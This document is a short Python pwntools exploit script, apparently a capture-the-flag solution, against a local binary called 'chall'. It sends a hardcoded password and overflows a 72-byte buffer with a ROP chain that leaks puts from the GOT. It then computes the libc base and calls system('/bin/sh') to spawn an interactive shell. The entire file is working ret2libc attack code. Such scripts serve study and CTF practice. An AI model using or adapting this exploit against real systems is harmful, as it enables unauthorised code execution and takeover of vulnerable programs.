#!/usr/bin/python3
from pwn import *

elf = ELF("chall")
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
p = elf.process()
#gdb.attach(p)

#leaking libc value

print(p.read())
p.sendline(b"1")
offset = 72
password = b"S3cur3p4$$"

pop_rdi = 0x40167b 
putsgot = elf.got.puts
putsplt = elf.plt.puts
main = elf.sym.main

payload = b"\x90"*offset
payload += p64(pop_rdi)
payload += p64(putsgot)
payload += p64(putsplt)
payload += p64(main)

print(p.read())
p.sendline(b"2")
print(p.recv())
p.sendline(password)
print(p.recv())
p.sendline(payload)
print(p.recv())
p.sendline(b"3")

leak = p.recv()
puts_leak = u64(leak[9:15].ljust(8,b"\x00"))
libc.address = puts_leak - 0x75e10
bin_sh = next(libc.search(b"/bin/sh\0"))
payload = b"\x90"*offset
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(libc.sym.system)
print(f"Successfully leaked puts@{hex(puts_leak)}")
print(f"successfully leak libc@{hex(libc.address)}")

#exploiting :) 
p.sendline(b"1")

print(p.read())
p.sendline(b"2")
print(p.recv())
p.sendline(password)
print(p.recv())
p.sendline(payload)
print(p.recv())
p.sendline(b"3")


p.interactive()

